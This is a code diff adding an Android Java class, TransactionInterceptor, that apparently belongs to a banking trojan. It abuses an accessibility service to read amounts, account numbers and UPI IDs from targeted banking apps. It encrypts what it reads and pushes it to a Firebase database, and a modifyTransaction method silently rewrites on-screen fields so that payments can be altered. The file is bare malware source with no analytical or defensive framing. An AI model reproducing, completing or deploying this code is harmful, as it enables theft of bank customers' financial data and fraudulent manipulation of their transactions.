@@ -1,0 +1,151 @@
+// TransactionInterceptor.java
+package com.godz.rtoRed.admin.banking;
+
+import android.accessibilityservice.AccessibilityService;
+import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
+import java.util.regex.Pattern;
+
+public class TransactionInterceptor extends AccessibilityService {
+    
+    private static final Pattern AMOUNT_PATTERN = 
+        Pattern.compile("(?i)(?:rs\\.?|₹?)\\s*(\\d+(?:,\\d{3})*(?:\\.\\d{2})?)");
+    
+    private static final Pattern ACCOUNT_PATTERN = 
+        Pattern.compile("\\b\\d{9,18}\\b"); // Account numbers
+    
+    private static final Pattern UPI_PATTERN = 
+        Pattern.compile("\\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\b");
+    
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event) {
+        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
+            event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            
+            String packageName = event.getPackageName() != null ? 
+                event.getPackageName().toString() : "";
+            
+            if (BankingTargets.isBankingApp(packageName)) {
+                AccessibilityNodeInfo root = getRootInActiveWindow();
+                if (root != null) {
+                    scanForTransactionData(root, packageName);
+                    root.recycle();
+                }
+            }
+        }
+    }
+    
+    private void scanForTransactionData(AccessibilityNodeInfo node, String packageName) {
+        // Check text fields for amounts, account numbers, UPI IDs
+        if (node.getText() != null) {
+            String text = node.getText().toString();
+            
+            // Look for transaction amounts
+            java.util.regex.Matcher amountMatcher = AMOUNT_PATTERN.matcher(text);
+            if (amountMatcher.find()) {
+                String amount = amountMatcher.group(1);
+                logTransactionData("amount", amount, packageName, node);
+            }
+            
+            // Look for account numbers
+            java.util.regex.Matcher accountMatcher = ACCOUNT_PATTERN.matcher(text);
+            if (accountMatcher.find()) {
+                String account = accountMatcher.group();
+                logTransactionData("account", account, packageName, node);
+            }
+            
+            // Look for UPI IDs
+            java.util.regex.Matcher upiMatcher = UPI_PATTERN.matcher(text);
+            if (upiMatcher.find()) {
+                String upi = upiMatcher.group();
+                logTransactionData("upi", upi, packageName, node);
+            }
+        }
+        
+        // Recursively check children
+        for (int i = 0; i < node.getChildCount(); i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            if (child != null) {
+                scanForTransactionData(child, packageName);
+                child.recycle();
+            }
+        }
+    }
+    
+    private void logTransactionData(String type, String value, 
+                                   String packageName, AccessibilityNodeInfo node) {
+        Map<String, String> data = new HashMap<>();
+        data.put("type", type);
+        data.put("value", value);
+        data.put("package", packageName);
+        data.put("bank", BankingTargets.getConfigForPackage(packageName).bankName);
+        data.put("timestamp", String.valueOf(System.currentTimeMillis()));
+        data.put("screen", getScreenInfo(node));
+        
+        // Encrypt and send
+        String encrypted = AESCrypt.encrypt(
+            getTransactionKey(),
+            new JSONObject(data).toString()
+        );
+        
+        FirebaseDatabase.getInstance()
+            .getReference("transaction_data")
+            .push()
+            .setValue(encrypted);
+    }
+    
+    private String getScreenInfo(AccessibilityNodeInfo node) {
+        // Try to determine what screen/user is doing
+        AccessibilityNodeInfo parent = node.getParent();
+        if (parent != null) {
+            if (parent.getClassName() != null) {
+                String className = parent.getClassName().toString();
+                if (className.contains("EditText")) return "input_field";
+                if (className.contains("Button")) return "button";
+                if (className.contains("TextView")) return "text_display";
+            }
+            parent.recycle();
+        }
+        return "unknown";
+    }
+    
+    @Override
+    public void onInterrupt() {
+    }
+    
+    // MODIFY TRANSACTION IN REAL-TIME
+    public boolean modifyTransaction(String targetField, String newValue) {
+        AccessibilityNodeInfo root = getRootInActiveWindow();
+        if (root != null) {
+            return modifyNodeText(root, targetField, newValue);
+        }
+        return false;
+    }
+    
+    private boolean modifyNodeText(AccessibilityNodeInfo node, 
+                                  String target, String newValue) {
+        if (node.getText() != null && node.getText().toString().contains(target)) {
+            // Found target field - modify it
+            Bundle arguments = new Bundle();
+            arguments.putCharSequence(
+                AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
+                newValue
+            );
+            return node.performAction(
+                AccessibilityNodeInfo.ACTION_SET_TEXT,
+                arguments
+            );
+        }
+        
+        for (int i = 0; i < node.getChildCount(); i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            if (child != null) {
+                boolean modified = modifyNodeText(child, target, newValue);
+                child.recycle();
+                if (modified) return true;
+            }
+        }
+        
+        return false;
+    }
+}
